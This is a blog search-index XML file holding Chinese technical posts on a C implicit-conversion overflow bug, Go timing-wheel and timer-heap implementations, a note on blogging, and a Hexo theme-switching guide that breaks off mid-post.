<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>改变一下思路</title>
    <url>/2021/05/27/%E6%80%9D%E8%B7%AF%E8%BD%AC%E5%8F%98/</url>
    <content><![CDATA[<p>最近在思考自己的博客应该写些什么内容。</p>
<span id="more"></span>

<p>其实一开始只是把博客作为一个跨平台的笔记本在用，所以如果去翻阅早期的博文可以看到很多内容都比较枯燥。至于为什么不选择<a href="https://shimo.im/desktop">石墨文档</a>或者 <a href="https://www.yinxiang.com/?referer=en">Evernote</a> 这样的平台是因为那时候觉得有个自己的网站很 cool😎。然后不知不觉这个博客就这样运行了三年多了，里面的内容也一直以技术为主。说起来还有个有意思的事，面试的时候面试官特地打开这个博客浏览了一下，然后肯定了我写博客这个行为，听他意思应该是有加分，算是一个意外收获吧。</p>
<p>这几天闲着没事干照例去翻一翻朋友的博客，发现大家不止会在上面讨论技术。吐槽日常生活、讨论数码科技、分享对产品的讲解……这些内容都很有意思，也提醒了我博客的本意是成为每个人在互联网上的一张名片，或者说是一种原始状态的“朋友圈”。如果一个人的朋友圈里只有工作相关的内容，那未免有些太无聊了吧？而且发布在朋友圈的内容大多比较简短，几十个字+两三张图片所能承载的信息还是有些捉襟见肘。以前和生活相关的内容大多在朋友圈或者个人贴吧，但经历了贴吧去年近乎野蛮地大规模删帖之后我对这些互联网公司的可靠性产生了深深地怀疑，谁知道哪天你写的东西莫名其妙就被“消失”了呢？另外我个人是比较享受写博文的感觉的，好像在和自己对话，一点点理清文章背后的逻辑。当然这样会花费更多时间和精力，但我始终觉得付出点时间去做思考总结是有益无害的。技术以外的世界也很精彩，同样值得记录。</p>
<p>如何提高博文的质量也是个问题。平心而论之前的博文大多是自己看完一本书或者几篇文章后的阅读笔记。但最近我开始尝试以自我为中心进行写作，不是单纯地总结别人的工作，而是自己去实践提出问题—&gt;查阅资料-&gt;动手验证-&gt;整理成文这个过程。二者主要的区别在于一篇文章的 idea 是自己提出来的，尽管内容不可避免地需要参考别人的东西，但总体思路是自己的。</p>
<p>博客的更新频率也可以作为近期学习质量的评价标准之一，没有输入就无从输出。希望自己不要太懒😭。</p>
<p><img src="https://i.loli.net/2021/05/27/5NBPl6pCstxI9AF.png" alt="E7LZ713R__82T@AY_RERCY8.png"></p>
]]></content>
      <categories>
        <category>日常</category>
      </categories>
      <tags>
        <tag>闲聊</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次溢出错误</title>
    <url>/2021/05/26/%E7%BB%86%E5%BF%83%E5%BE%88%E9%87%8D%E8%A6%81%E2%80%94%E2%80%94%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>习惯了弱类型语言再回到 C 这类强类型语言的结果是，在各种类型转换之间晕头转向。</p>
<span id="more"></span>

<p>今天在用 C 写<a href="https://github.com/yue-qiu/memoryPool">内存池</a>的时候，遇到了一个蛮有意思的隐式类型转换错误，特地记录一下。</p>
<p>先写一个 test1.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 2097150</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1025</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> c = a * b; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c in test1: %lu\n&quot;</span>, c); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看 test2.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 2097150</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> b = <span class="number">1025</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> c = a * b; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c in test2: %lu\n&quot;</span>, c); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两段代码变量 b 的数据类型不同，输出试试：</p>
<p><img src="https://i.loli.net/2021/05/26/Fx6odkEagmhtu28.png" alt="image.png"></p>
<p>Oops，看来出了点意外。<code>test2</code> 产生了我的预期值，而 <code>test1</code> 似乎是发生了溢出。但 1025 * 2097150 的结果是小于 unsigned long 的最大值的，那恐怕不是溢出那么简单了。让我们从汇编的角度看看底层到底发生了什么。</p>
<p>得到两段代码的汇编文件并用 vim 对比两者的不同之处：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -S test1.c -o test1.s</span><br><span class="line">gcc -S test2.c -o test2.s</span><br><span class="line">vim -d test1.s test2.s </span><br></pre></td></tr></table></figure>

<p>可以看到汇编代码的主要差别在第 22 行，test1.s 使用了 <code>cltq</code> 指令：</p>
<p><img src="https://i.loli.net/2021/05/26/XNZdVvk53BqjPyY.png" alt="image.png"></p>
<p>查阅资料发现 <code>cltq</code> 是这个意思：</p>
<blockquote>
<p>cltq R[%rax ] &lt;- SignExtend(R[%eax]) Convert %eax to quad word</p>
</blockquote>
<p>也就是说 <code>cltq</code> 会把 <code>%eax</code> 的值<strong>带符号地</strong>扩展到 <code>%rax</code>。而 1025 * 2097150 的结果在 <code>%eax</code> 最高位的取值是 1，扩展之后自然看起来就像溢出了一样。</p>
<p>之所以产生这个错误，是因为一个 32 位有符号的右值被赋给了 64 位无符号左值，这个过程中发生的隐式类型转换由一条 <code>ctql</code> 指令来完成。使用强类型语言进行编码的时候要非常谨慎地在不同数据类型之间进行转换。</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>时间轮与时间堆</title>
    <url>/2021/05/19/%E6%97%B6%E9%97%B4%E8%BD%AE%E4%B8%8E%E6%97%B6%E9%97%B4%E5%A0%86/</url>
    <content><![CDATA[<p>有时服务器需要在某一时间点触发某一事件，比如下午三点更新某个资源。一个很自然的想法是使用计时容器来管理所有的定时事件，熟悉 C++ 的读者可以将其类比为 STL 中的 vector、map 等。定时容器内部的一个个对象则称为定时器，是对定时时间的封装。但是为了方便，通常直接把定时容器称为定时器。<br>Go 语言标准库内置了对定时器的支持：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t1 := time.NewTimer(time.Second * <span class="number">5</span>)  <span class="comment">// 创建一个 5s 后到期的 timer</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-t1.C:</span><br><span class="line">            fmt.Println(<span class="string">&quot;5s timer&quot;</span>)</span><br><span class="line">            t1.Reset(time.Second * <span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上程序每隔 5s 打印一个 “5s timer”，原因是 runtime 每 5s 触发一次定时事件（向 t1.C 中发送一个 time.Time）。</p>
<p>不同类型的定时器用不同的数据结构来组织定时事件。目前生产中比较常用的方式是四叉堆，它的定时较为精确且各种操作的时间复杂度较好。本文将会讲解两种实现方式：时间轮与基于最小二叉堆的时间堆。</p>
<h2 id="时间轮"><a href="#时间轮" class="headerlink" title="时间轮"></a>时间轮</h2><p>顾名思义时间轮以一个“轮子”的形式组织定时事件。如下图所示，实线指针指向一个插槽（slot），定时事件被封装为一个个桶（bucket） 以链表的形式保存在 slot 上。指针按顺时针转动，每次转动一个 si（slot interval）。指针转动一次，即检查当前 slot 保存的 bucket 链表，执行超时任务。</p>
<p><img src="https://i.loli.net/2021/05/19/bw69jgvqoFuVnLp.png" alt="image.png"></p>
<p>那么现在问题就是确定一个定时任务该放到哪个 slot 里。设时间轮槽数为 $N$，当前指针指向 $cur$，定时任务的定时时长为 $ti$，待插入位置为 $posi$，则计算公式为$$posi = (cur + (ti / si)) \pmod N$$</p>
<p>算法思想类似哈希表，把多个任务按照定时时长分散到几个槽，N 越大单个槽保存的的桶越少。由此可见，si 决定了时间轮的精度，而 N 决定了任务的执行效率。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> timeWheel</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 双向链表</span></span><br><span class="line"><span class="keyword">type</span> bucket <span class="keyword">struct</span> &#123;</span><br><span class="line">    prev, next *bucket</span><br><span class="line">    data <span class="keyword">int</span> <span class="comment">// 回调函数的参数</span></span><br><span class="line">    callBack <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>)</span></span></span><br><span class="line">    rotation <span class="keyword">int</span> <span class="comment">// 时间轮转过多少圈之后这个桶才生效</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newBucket</span><span class="params">(rotation <span class="keyword">int</span>, data <span class="keyword">int</span>, callBack <span class="keyword">func</span>(<span class="keyword">int</span>)</span>) *<span class="title">bucket</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="built_in">new</span>(bucket)</span><br><span class="line">    t.callBack = callBack</span><br><span class="line">    t.data = data</span><br><span class="line">    t.rotation = rotation</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TimeWheel <span class="keyword">struct</span> &#123;</span><br><span class="line">    slots []*bucket</span><br><span class="line">    SlotNum <span class="keyword">int</span></span><br><span class="line">    SI time.Duration <span class="comment">// slot interval, 转动一个 slot 所需要的时间</span></span><br><span class="line">    cur <span class="keyword">int</span> <span class="comment">// 当前指向的 slot</span></span><br><span class="line">    count <span class="keyword">int</span> <span class="comment">// 时间轮里总 bucket 计数</span></span><br><span class="line">    stopped <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTimeWheel</span><span class="params">(si time.Duration, n <span class="keyword">int</span>)</span> *<span class="title">TimeWheel</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;TimeWheel&#123;</span><br><span class="line">        SI: si,</span><br><span class="line">        SlotNum: n,</span><br><span class="line">        slots: <span class="built_in">make</span>([]*bucket, n, n),</span><br><span class="line">        cur: <span class="number">0</span>,</span><br><span class="line">        stopped: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">Add</span><span class="params">(cb <span class="keyword">func</span>(<span class="keyword">int</span>)</span>, <span class="title">data</span> <span class="title">int</span>, <span class="title">timeout</span> <span class="title">time</span>.<span class="title">Duration</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> tw == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ticks = <span class="number">0</span> <span class="comment">// 记录一个 bucket 需要经历几次 tick</span></span><br><span class="line">    <span class="keyword">if</span> timeout &lt; tw.SI &#123;</span><br><span class="line">        ticks = <span class="number">1</span> <span class="comment">// 如果 timeout 小于 SI，说明这个 time wheel 精度不够。令 ticks 为 1 即这个 timer 在下一次 tick 就会被使用</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ticks = <span class="keyword">int</span>(timeout / tw.SI)</span><br><span class="line">    &#125;</span><br><span class="line">    posi := (tw.cur + ticks % tw.SlotNum) % tw.SlotNum <span class="comment">// 计算插入位置</span></span><br><span class="line">    rotation := ticks / tw.SlotNum <span class="comment">// 计算时间轮要转几圈</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> b = newBucket(rotation, data, cb)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把 bucket 插入到对应 slot 中。头插法</span></span><br><span class="line">    <span class="keyword">if</span> tw.slots[posi] == <span class="literal">nil</span> &#123;</span><br><span class="line">        tw.slots[posi] = b</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tw.slots[posi].prev = b</span><br><span class="line">        b.next = tw.slots[posi]</span><br><span class="line">        tw.slots[posi] = b</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tw.count++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历 cur 指向的 slot，执行其中的定时任务</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">tick</span><span class="params">()</span></span> &#123;</span><br><span class="line">    tmp := tw.slots[tw.cur]</span><br><span class="line">    <span class="keyword">for</span> tmp != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;tick the bucket once&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> tmp.rotation &gt; <span class="number">0</span> &#123;</span><br><span class="line">            tmp.rotation--</span><br><span class="line">            tmp = tmp.next</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;now: %vms &quot;</span>, time.Now().Nanosecond() / <span class="number">1000000</span>)</span><br><span class="line">            tmp.callBack(tmp.data)</span><br><span class="line">            <span class="comment">// 删除这个 bucket</span></span><br><span class="line">            <span class="keyword">if</span> tmp == tw.slots[tw.cur] &#123;</span><br><span class="line">                newHead := tmp.next</span><br><span class="line">                tmp.next = <span class="literal">nil</span></span><br><span class="line">                <span class="keyword">if</span> newHead != <span class="literal">nil</span> &#123;</span><br><span class="line">                    newHead.prev = <span class="literal">nil</span></span><br><span class="line">                &#125;</span><br><span class="line">                tw.slots[tw.cur] = newHead</span><br><span class="line">                tmp = newHead</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp2 := tmp.next</span><br><span class="line">                tmp.prev.next = tmp2</span><br><span class="line">                <span class="keyword">if</span> tmp2 != <span class="literal">nil</span> &#123;</span><br><span class="line">                    tmp2.prev = tmp.prev</span><br><span class="line">                &#125;</span><br><span class="line">                tmp.prev = <span class="literal">nil</span></span><br><span class="line">                tmp.next = <span class="literal">nil</span></span><br><span class="line">                tmp = tmp2</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cur 指向下一个 slot</span></span><br><span class="line">    tw.cur++</span><br><span class="line">    tw.cur %= tw.SlotNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">Tick</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    <span class="keyword">if</span> tw == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            tw.tick()</span><br><span class="line">            time.Sleep(tw.SI)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tw *TimeWheel)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> tw == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tw.stopped &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="时间堆"><a href="#时间堆" class="headerlink" title="时间堆"></a>时间堆</h2><p>上述时间轮有两个明显的问题：</p>
<ol>
<li>精度依赖于 si</li>
<li>获取 bucket 的时间复杂度是 O(n)</li>
</ol>
<p>工业上最常用的定时器的实现方式是时间堆。由最早到期的那个任务决定心跳间隔，这样每次心跳必定至少有一个超时任务待处理，同时由于堆的特性我们添加、删除一个 bucket 的时间复杂度是 O(logN)。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> heapBucket <span class="keyword">struct</span> &#123;</span><br><span class="line">    cb <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span>)</span></span></span><br><span class="line">    data <span class="keyword">int</span></span><br><span class="line">    expire time.Time</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TimeHeap 是 heapBucket.expire 的最小二叉堆</span></span><br><span class="line"><span class="keyword">type</span> TimeHeap <span class="keyword">struct</span> &#123;</span><br><span class="line">    Capacity <span class="keyword">int</span></span><br><span class="line">    arr []*heapBucket</span><br><span class="line">    size <span class="keyword">int</span> <span class="comment">// timer 计数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newHeapBucket</span><span class="params">(cb <span class="keyword">func</span>(<span class="keyword">int</span>)</span>, <span class="title">data</span> <span class="title">int</span>, <span class="title">timeout</span> <span class="title">time</span>.<span class="title">Time</span>) *<span class="title">heapBucket</span></span> &#123;</span><br><span class="line">    t := <span class="built_in">new</span>(heapBucket)</span><br><span class="line">    t.cb = cb</span><br><span class="line">    t.data = data</span><br><span class="line">    t.expire = timeout</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTimeHeap</span><span class="params">(capacity <span class="keyword">int</span>)</span> *<span class="title">TimeHeap</span></span> &#123;</span><br><span class="line">    th := <span class="built_in">new</span>(TimeHeap)</span><br><span class="line">    th.Capacity = capacity</span><br><span class="line">    th.arr = <span class="built_in">make</span>([]*heapBucket, capacity+<span class="number">1</span>, capacity+<span class="number">1</span>) <span class="comment">// 为了便于计算父子索引，把 th.arr[0] 作为哨兵，bucket 从 th.arr[1]开始保存</span></span><br><span class="line">    <span class="keyword">return</span> th</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Add</span><span class="params">(cb <span class="keyword">func</span>(<span class="keyword">int</span>)</span>, <span class="title">data</span> <span class="title">int</span>, <span class="title">timeout</span> <span class="title">time</span>.<span class="title">Time</span>) <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> th.size == th.Capacity &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">&quot;heap overflow&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    t := newHeapBucket(cb, data, timeout)</span><br><span class="line">    n := th.size + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从末端开始上浮</span></span><br><span class="line">    th.arr[n] = t</span><br><span class="line">    <span class="keyword">for</span> n &gt; <span class="number">1</span> &amp;&amp; th.arr[n/<span class="number">2</span>].expire.After(th.arr[n].expire) &#123;</span><br><span class="line">        tmp := th.arr[n/<span class="number">2</span>]</span><br><span class="line">        th.arr[n/<span class="number">2</span>] = th.arr[n]</span><br><span class="line">        th.arr[n] = tmp</span><br><span class="line">        n /= <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">    th.size++</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Peek</span><span class="params">()</span> *<span class="title">heapBucket</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th.size == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> th.arr[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">pop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    th.arr[<span class="number">1</span>] = th.arr[th.size] <span class="comment">// 末端 bucket 替换堆顶以保持完全二叉树的性质</span></span><br><span class="line">    th.size--</span><br><span class="line">    n := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 顶部下沉</span></span><br><span class="line">    <span class="keyword">for</span> <span class="number">2</span> * n &lt;= th.size &#123;</span><br><span class="line">        j := <span class="number">2</span> * n</span><br><span class="line">        <span class="keyword">if</span> j &lt; th.size &amp;&amp; th.arr[j].expire.After(th.arr[j+<span class="number">1</span>].expire) &#123;</span><br><span class="line">            j++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> th.arr[n].expire.After(th.arr[j].expire) &#123;</span><br><span class="line">            tmp := th.arr[j]</span><br><span class="line">            th.arr[j] = th.arr[n]</span><br><span class="line">            th.arr[n] = tmp</span><br><span class="line">            n = j</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">tick</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    <span class="comment">// 不断检查堆顶，执行 timer</span></span><br><span class="line">    <span class="keyword">for</span> th.size != <span class="number">0</span> &#123;</span><br><span class="line">        tmp := th.Peek()</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        now := time.Now()</span><br><span class="line">        <span class="keyword">if</span> tmp.expire.After(now) &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fmt.Printf(<span class="string">&quot;tick the bucket once, data: %v, expire time: %v, now: %v\n&quot;</span>, tmp.data, tmp.expire, now)</span><br><span class="line">        tmp.cb(tmp.data)</span><br><span class="line">        th.pop()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Tick</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> interval time.Duration</span><br><span class="line">            <span class="keyword">if</span> top := th.Peek(); top != <span class="literal">nil</span> &#123;</span><br><span class="line">                interval = top.expire.Sub(time.Now()) <span class="comment">// 取最短心搏间隔</span></span><br><span class="line">            &#125;</span><br><span class="line">            time.Sleep(interval)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-th.stopped:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    th.tick()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(th *TimeHeap)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> th == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;Not initialized&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    th.stopped &lt;-<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>timer</tag>
      </tags>
  </entry>
  <entry>
    <title>给你的hexo博客换一个主题吧</title>
    <url>/2021/05/19/%E7%BB%99%E4%BD%A0%E7%9A%84hexo%E5%8D%9A%E5%AE%A2%E6%8D%A2%E4%B8%80%E4%B8%AA%E4%B8%BB%E9%A2%98/</url>
    <content><![CDATA[<p><a href="https://hexo.io/zh-cn/">hexo</a> 是一款非常优秀的的博客框架，它支持 MarkDown，拥有社区提供的各式各样的插件，只要几条简单的指令就可以把博客部署到 Github Page、Heroku 等平台。<a href="https://github.com/next-theme/hexo-theme-next">NexT</a> 则是 hexo 下广受好评的博客主题，提供了好几种页面布局供用户选择，天然集成了许多常用插件，因此许多博主都选择以它为例子讲述如何搭建属于自己的博客。笔者在刚入门 hexo 时也选择了 NexT，但在博客运行三年多以后已经对其产生了审美疲劳。事实上社区提供了上百款主题可供选择，其中亦不乏佼佼者，所以笔者决定尝试将博客主题更换为 <a href="https://shen-yu.gitee.io/">Ayer</a> 并记录下整个踩坑过程，以飨后人。</p>
<h2 id="安装-Ayer"><a href="#安装-Ayer" class="headerlink" title="安装 Ayer"></a>安装 Ayer</h2><p>首先在博客根目录把 Ayer 下载到 <code>themes/</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 国内用户如果速度较慢，可以把 github 地址替换为：https://gitee.com/mirrors/ayer.git</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Shen-Yu/hexo-theme-ayer.git themes/ayer</span><br></pre></td></tr></table></figure>

<p>然后在博客的 <code>_config.yml</code> 文件里更改主题选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: ayer</span><br></pre></td></tr></table></figure>

<p>然后直接部署就可以了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<p>好了，理论上 hexo 切换主题的过程就是这么简单，就跟把大象装进冰箱一样，只要三步：</p>
<ol>
<li>挑选并下载心仪的主题到博客根目录的 <code>themes/</code> 文件夹下</li>
<li>更改博客配置文件 <code>_config.yml</code> 中的 <code>theme</code> 选项</li>
<li>更新并部署到远端</li>
</ol>
<h2 id="一些坑"><a href="#一些坑" class="headerlink" title="一些坑"></a>一些坑</h2><p>历史检验告诉我们，理论要跟实际相结合，理想是美好的现实是残酷的。更换主题过程中往往会出现一些意料之外的错误。部分错误可能是主题本身某些配置引起的，一般在该主题的官网会有相应 QA，仔细阅读这些内容会很有帮助。</p>
<p>但也有些错误可能与用户自己的 hexo、node.js 版本等有关，这就需要你自己去调整。</p>
<h3 id="升级-Hexo"><a href="#升级-Hexo" class="headerlink" title="升级 Hexo"></a>升级 Hexo</h3><p>一些比较新的主题可能需要新版 hexo 的某些特性才能正常工作，而对于用户来说一般很少会去更新自己的 hexo 版本，这就需要我们先升级自己的 hexo：</p>
